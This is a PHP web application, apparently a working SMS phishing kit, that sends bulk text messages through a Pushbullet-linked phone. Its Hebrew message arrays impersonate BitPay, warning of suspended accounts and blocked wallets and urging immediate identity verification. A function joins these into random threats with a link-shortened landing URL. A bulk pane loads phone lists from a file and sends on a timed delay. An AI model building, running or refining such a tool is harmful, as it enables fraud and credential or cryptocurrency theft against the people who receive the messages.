<?php
declare(strict_types=1);
mb_internal_encoding('UTF-8');
session_start();

$ACCESS_TOKEN = $_SESSION['PB_TOKEN'] ?? '';
$LONG_URL     = $_SESSION['LONG_URL'] ?? '';

$DIDLI_API  = 'https://6ejpppqpkh.execute-api.eu-west-1.amazonaws.com/Prod/create';
$DIDLI_BASE = 'https://did.li/';

$prefixes = ["הודעה דחופה מ-BitPay","החשבון שלך ב-BitPay הושעה","פעילות חריגה אותרה בחשבונך","נדרשת בדיקת זהות מידית","אימות חשבון BitPay שלך נדרש","ביטול שירות עקב פעילות חשודה","חשוב: החשבון שלך הושהה","דרוש אימות בעלות לחשבון","נדרשת פעולה מיידית לאימות זהות","אנא אמת את חשבונך ב-BitPay"];
$issues   = ["עקב פעילות חשודה, החשבון שלך הושעה","זוהתה גישה לא רגילה לחשבונך ב-BitPay","נדרש לאמת את זהותך לשחרור החשבון","אם לא תבוצע אימות, השירות יופסק","מערכת BitPay זיהתה פעילות חריגה","הגישה לחשבון שלך מוגבלת עד לאימות זהות","החשבון שלך בסכנת השעיה קבועה","קיימת בעיה עם אבטחת החשבון שלך","נדרשת פעולה דחופה לשחזור החשבון","מערכת BitPay מחייבת אימות מיידי"];
$instructions = ["לחץ על הקישור כדי לאמת את זהותך ולשחזר את השירות","בצע אימות זהות מידי כדי להמשיך להשתמש ב-BitPay","מלא את פרטי האימות הנדרשים בקישור המצורף","שים לב: ללא אימות זהות, החשבון יחסם","השלם את תהליך האימות עוד היום כדי להימנע מהפסקת שירות","אנא פעל בהתאם להנחיות במערכת BitPay","לטיפול מיידי, אמת את זהותך בלחיצה כאן","הימנע מחסימה מלאה של החשבון על ידי אימות זהותך","בצע את הפעולה הנדרשת באופן מיידי","השירות שלך יימשך רק לאחר אימות זהות תקין"];
$actions  = ["אם לא תבוצע אימות, השירות שלך יופסק","גישה לחשבון שלך תוגבל לצמיתות","המערכת תחסום את החשבון לשימוש נוסף","יתבצע סגירת חשבון מיידית ללא אימות","לא תוכל לבצע עסקאות ב-BitPay עד לאימות מוצלח","החסימה תוסר רק לאחר תהליך אימות תקין","התעלמות מהודעה זו תוביל להשבתת החשבון","חשבון BitPay שלך ייחסם בפני כל פעולה נוספת","גישה לארנק הדיגיטלי תיחסם מיידית","אימות מיידי נדרש למניעת הפסקת השירות"];

function pb_request(string $m,string $ep,?array $j=null):array{
    global $ACCESS_TOKEN;
    $c=curl_init();
    curl_setopt_array($c,[CURLOPT_URL=>"https://api.pushbullet.com/v2/".ltrim($ep,'/'),CURLOPT_RETURNTRANSFER=>1,CURLOPT_CUSTOMREQUEST=>strtoupper($m),CURLOPT_HTTPHEADER=>['Access-Token: '.$ACCESS_TOKEN,'Content-Type: application/json'],CURLOPT_TIMEOUT=>30]);
    if($j)curl_setopt($c,CURLOPT_POSTFIELDS,json_encode($j,JSON_UNESCAPED_UNICODE));
    $raw=curl_exec($c);$err=curl_errno($c);$code=curl_getinfo($c,CURLINFO_HTTP_CODE);curl_close($c);
    return ['ok'=>(!$err&&$code>=200&&$code<300),'code'=>$code,'raw'=>$raw,'data'=>$raw?json_decode($raw,true):null,'err'=>$err?curl_error($c):null];
}
function pb_get_user():array{return pb_request('GET','users/me');}
function pb_get_devices():array{return pb_request('GET','devices');}
function normalize_phone(string $n):string{$n=preg_replace('~[\s\-\(\)]~','',trim($n));if($n!==''&&$n[0]!=='+' ){if(strpos($n,'00')===0)$n='+'.substr($n,2);elseif($n[0]==='0')$n='+972'.substr($n,1);else$n='+'.$n;}return $n;}
function pb_send_sms(string $id,string $ph,string $msg):array{return pb_request('POST','texts',['data'=>['target_device_iden'=>$id,'addresses'=>[$ph],'message'=>$msg,'guid'=>bin2hex(random_bytes(16))]]);}
function pb_push_note(string $id,string $t='',string $b=''):array{return pb_request('POST','pushes',['type'=>'note','device_iden'=>$id,'title'=>$t,'body'=>$b]);}
function short_link(string $u):string{global $DIDLI_API,$DIDLI_BASE;$p=json_encode(['url'=>preg_match('#^https?://#',$u)?$u:"https://$u"]);$c=curl_init($DIDLI_API);curl_setopt_array($c,[CURLOPT_POST=>1,CURLOPT_POSTFIELDS=>$p,CURLOPT_HTTPHEADER=>['Content-Type: application/json'],CURLOPT_RETURNTRANSFER=>1,CURLOPT_SSL_VERIFYPEER=>1,CURLOPT_SSL_VERIFYHOST=>2,CURLOPT_TIMEOUT=>15]);$r=curl_exec($c);curl_close($c);$j=json_decode($r,true);return !empty($j['code'])?$DIDLI_BASE.$j['code']:$u;}
function random_msg():string{global $prefixes,$issues,$instructions,$actions,$LONG_URL;$l=$LONG_URL!==''?short_link($LONG_URL):'';return $prefixes[array_rand($prefixes)].': '.$issues[array_rand($issues)].'. '.$instructions[array_rand($instructions)].', '.$actions[array_rand($actions)].($l?': '.$l:'');}
function respond($a):never{header('Content-Type: application/json;charset=utf-8');echo json_encode($a,JSON_UNESCAPED_UNICODE);exit;}
function h(?string $s):string{return htmlspecialchars($s??'',ENT_QUOTES,'UTF-8');}

if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['save_settings'])){
    $_SESSION['PB_TOKEN']=trim($_POST['access_token']??'');
    $_SESSION['LONG_URL']=trim($_POST['long_url']??'');
    header('Location: '.$_SERVER['PHP_SELF']);exit;
}
if(isset($_GET['logout'])){session_destroy();header('Location: '.$_SERVER['PHP_SELF']);exit;}

if(isset($_GET['ajax'])){
    if($ACCESS_TOKEN==='')respond(['error'=>true,'msg'=>'No token']);
    switch($_GET['ajax']){
        case 'devices':$d=pb_get_devices();if(!$d['ok'])respond(['error'=>true,'msg'=>"HTTP {$d['code']}"]);$ph=array_values(array_filter($d['data']['devices']??[],fn($x)=>!empty($x['active'])&&!empty($x['has_sms'])));respond(['error'=>false,'devices'=>$ph]);
        case 'send_one':$r=pb_send_sms(trim($_POST['device']),normalize_phone($_POST['number']),trim($_POST['msg']));respond(['ok'=>$r['ok'],'code'=>$r['code'],'resp'=>$r['raw']]);
    }respond(['error'=>true]);
}

$flash=[];$userRes=['ok'=>false];$user=[];$isPro=false;$devices=[];$smsDevices=[];
if($ACCESS_TOKEN!==''){ $userRes=pb_get_user();$user=$userRes['data']??[];$isPro=$user['pro']??false;$d=pb_get_devices();if($d['ok'])foreach($d['data']['devices'] as $x){if(!($x['active']??0))continue;$devices[]=$x;if($x['has_sms']??0)$smsDevices[]=$x;}}

if($ACCESS_TOKEN!=='' && $_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['mode'])){
    if($_POST['mode']==='single_sms'){
        $dev=$_POST['sms_device_iden'];$raw=$_POST['numbers'];$msg=$_POST['sms_message'];
        if(!$isPro)$flash[]=['type'=>'error','msg'=>'Pro needed'];elseif(!$dev||!$raw||!$msg)$flash[]=['type'=>'error','msg'=>'All fields'];else{
            $nums=array_filter(array_map('normalize_phone',explode(',',$raw)));$ok=0;$fail=[];
            foreach($nums as $n){$r=pb_send_sms($dev,$n,$msg);$r['ok']?$ok++:$fail[]=$n;}
            if($ok)$flash[]=['type'=>'ok','msg'=>"Sent to $ok"];if($fail)$flash[]=['type'=>'error','msg'=>'Failed: '.implode(',',$fail)];
        }
    }
    if($_POST['mode']==='push'){
        $dev=$_POST['device_iden'];$t=$_POST['title'];$b=$_POST['body'];
        if(!$dev||(!$t&& !$b))$flash[]=['type'=>'error','msg'=>'Device and content required'];else{
            $r=pb_push_note($dev,$t,$b);$flash[]=['type'=>$r['ok']?'ok':'error','msg'=>$r['ok']?'Push sent':"Push failed (HTTP {$r['code']})"];
        }
    }
}
?>
<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sender</title>
<style>:root{--bg:#0f172a;--panel:#111827;--muted:#6b7280;--text:#e5e7eb;--ok:#16a34a;--err:#dc2626;--accent:#3b82f6;--accent2:#06b6d4}*{box-sizing:border-box}body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:linear-gradient(135deg,#0f172a,#0b1020);color:var(--text);padding:24px}.container{max-width:980px;margin:0 auto}.card{background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.02));border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:18px 18px 26px;box-shadow:0 10px 25px rgba(0,0,0,.25);backdrop-filter:blur(6px)}.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}.badge{font-size:.85rem;color:#fff;padding:.25rem .6rem;border-radius:999px}.badge.pro{background:linear-gradient(90deg,var(--accent),var(--accent2))}.badge.free{background:var(--muted)}h1{font-size:1.35rem;margin:.2rem 0}.sub{color:var(--muted);font-size:.95rem}label{display:block;font-size:.9rem;color:#cbd5e1;margin-bottom:.35rem}input,textarea,select{width:100%;background:#0b1221;color:var(--text);border:1px solid #1f2937;border-radius:10px;padding:.7rem .9rem;font-size:.93rem}textarea{min-height:120px;resize:vertical}.tabs{display:flex;gap:8px;margin:.5rem 0 1rem}.tab{background:#0b1221;color:#cbd5e1;border:1px solid #1f2937;padding:.55rem .9rem;border-radius:999px;cursor:pointer;font-size:.95rem}.tab.active{background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;border-color:transparent}.actions{display:flex;gap:12px;margin-top:12px;flex-wrap:wrap}button{background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;border:none;padding:.75rem 1.1rem;border-radius:10px;cursor:pointer;font-weight:600}.flash{margin:.75rem 0;padding:.7rem .9rem;border-radius:10px;border:1px solid transparent}.flash.ok{background:rgba(22,163,74,.15);border-color:rgba(22,163,74,.35)}.flash.error{background:rgba(220,38,38,.15);border-color:rgba(220,38,38,.35)}.small{font-size:.85rem;color:#94a3b8}.row{display:grid;grid-template-columns:1fr 1fr;gap:16px}@media(max-width:820px){.row{grid-template-columns:1fr}}.box{background:#0b1221;border:1px solid #1f2937;color:#cbd5e1;padding:10px;border-radius:8px;max-height:220px;overflow-y:auto;font-size:.9rem}.box .ok{color:var(--ok)}.box .err{color:var(--err)}</style></head>
<body><div class="container"><div class="card">
<div class="header"><div><h1>Pushbullet Sender</h1><div class="sub"><?php if($ACCESS_TOKEN===''):?><b>No token</b><?php elseif($userRes['ok']):?>Signed in as <b><?=h($user['email']??'—')?></b><?php else:?><b>Token error</b><?php endif;?></div></div><span class="badge <?=$isPro?'pro':'free'?>"><?=$ACCESS_TOKEN===''?'No token':($isPro?'Pro':'Free')?></span></div>
<?php foreach($flash as $f):?><div class="flash <?=$f['type']==='ok'?'ok':'error'?>"><?=$f['msg']?></div><?php endforeach;?>
<form method="post" style="margin-bottom:18px"><div class="row"><div><label>Token</label><input type="password" name="access_token" value="<?=h($ACCESS_TOKEN)?>"></div><div><label>Landing URL</label><input type="text" name="long_url" value="<?=h($LONG_URL)?>"></div><div style="align-self:flex-end"><button type="submit" name="save_settings">Save</button><?php if($ACCESS_TOKEN||$LONG_URL):?><a href="?logout" style="margin-left:8px;color:#dc2626;font-size:.9rem;text-decoration:none">Clear</a><?php endif;?></div></div></form>
<?php if($ACCESS_TOKEN===''):?><div class="flash error">Save settings to continue</div><?php else:?>
<div class="tabs"><button class="tab active" data-id="single">Single SMS</button><button class="tab" data-id="bulk">Bulk SMS</button><button class="tab" data-id="push">Push</button></div>
<form method="post" id="pane-single" class="pane"><input type="hidden" name="mode" value="single_sms"><div class="row"><div><label>Device</label><select name="sms_device_iden" required><option value="">—</option><?php $l=$smsDevices?:$devices;foreach($l as $d):?><option value="<?=h($d['iden'])?>"><?=h(($d['nickname']??$d['model']).' • '.($d['manufacturer']??''))?></option><?php endforeach;?></select></div><div><label>Numbers</label><input type="text" name="numbers" placeholder="+9725..., +1..."></div></div><div><label>Message</label><textarea name="sms_message" required></textarea></div><div class="actions"><button>Send SMS</button></div></form>

<!-- Bulk SMS Tab after modification -->
<div id="pane-bulk" class="pane" style="display:none">
  <div class="row">
    <div>
      <label>Device</label>
      <select id="bulk-device">
        <option value="">—</option>
        <?php foreach($smsDevices as $d):?>
        <option value="<?=h($d['iden'])?>"><?=h(($d['nickname']??$d['model']).' • '.($d['manufacturer']??''))?></option>
        <?php endforeach;?>
      </select>
    </div>
    <div>
      <label>Delay (s)</label>
      <input type="text" id="bulk-delay" value="30">
    </div>
  </div>
  <div class="row">
    <div>
      <label>TXT numbers</label>
      <input type="file" id="bulk-file" accept=".txt">
    </div>
    <div>
      <label>Message</label>
      <textarea id="bulk-message" placeholder="Your message here" required></textarea>
    </div>
  </div>
  <div class="row">
    <div>
      <label>Numbers</label>
      <div id="bulk-num-box" class="box"></div>
    </div>
  </div>
  <div class="actions">
    <button type="button" id="bulk-send">Send Bulk</button>
    <span id="bulk-status" class="small"></span>
  </div>
  <div id="bulk-log" class="box" style="margin-top:12px"></div>
</div>

<form method="post" id="pane-push" class="pane" style="display:none"><input type="hidden" name="mode" value="push"><div class="row"><div><label>Device</label><select name="device_iden" required><option value="">—</option><?php foreach($devices as $d):?><option value="<?=h($d['iden'])?>"><?=h(($d['nickname']??$d['model']).' • '.($d['icon']??''))?></option><?php endforeach;?></select></div><div><label>Title</label><input type="text" name="title"></div></div><div><label>Body</label><textarea name="body"></textarea></div><div class="actions"><button>Send Push</button></div></form>
<?php endif;?></div></div>
<script>
const $$=s=>document.querySelectorAll(s);$$('.tab').forEach(t=>t.addEventListener('click',()=>{$$('.tab').forEach(x=>x.classList.remove('active'));t.classList.add('active');const id=t.dataset.id;$$('.pane').forEach(p=>p.style.display=p.id==='pane-'+id?'':'none');}));

// Bulk SMS code (rewritten)
const logBox = document.getElementById('bulk-log'),
      numBox = document.getElementById('bulk-num-box'),
      statusEl = document.getElementById('bulk-status');

let numbers = [], idx = 0, delayMs = 30000;

function setStatus(x, c) {
    statusEl.textContent = x;
    if (c) statusEl.style.color = c;
}
function log(x, c = '') {
    logBox.innerHTML += `<div class="${c}">${x}</div>`;
    logBox.scrollTop = logBox.scrollHeight;
}

document.getElementById('bulk-file')?.addEventListener('change', e => {
    const f = e.target.files[0];
    if (!f) return;
    const rd = new FileReader();
    rd.onload = v => {
        numbers = v.target.result.split(/\r?\n/).map(x => x.trim()).filter(Boolean);
        numBox.textContent = numbers.join('\n');
        setStatus(`Loaded ${numbers.length}`, '#16a34a');
    };
    rd.readAsText(f);
});

function sendNext() {
    if (idx >= numbers.length) return setStatus('Done', '#16a34a');
    const dev = document.getElementById('bulk-device').value;
    const msg = document.getElementById('bulk-message').value.trim();
    if (!dev) return setStatus('Select device', '#dc2626');
    if (!msg) return setStatus('Message required', '#dc2626');
    const num = numbers[idx];
    setStatus(`Sending ${idx + 1}/${numbers.length}`, '#ffe');
    fetch('?ajax=send_one', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ device: dev, number: num, msg })
    }).then(r => r.json()).then(o => {
        o.ok ? log(`✔ ${num}`, 'ok') : log(`✖ ${num} (HTTP ${o.code})`, 'err');
    }).finally(() => {
        idx++;
        setTimeout(sendNext, delayMs);
    });
}

document.getElementById('bulk-send')?.addEventListener('click', () => {
    delayMs = parseInt(document.getElementById('bulk-delay').value || '30') * 1000;
    if (!numbers.length) return setStatus('No numbers', '#dc2626');
    idx = 0;
    logBox.innerHTML = '';
    sendNext();
});
</script></body></html>
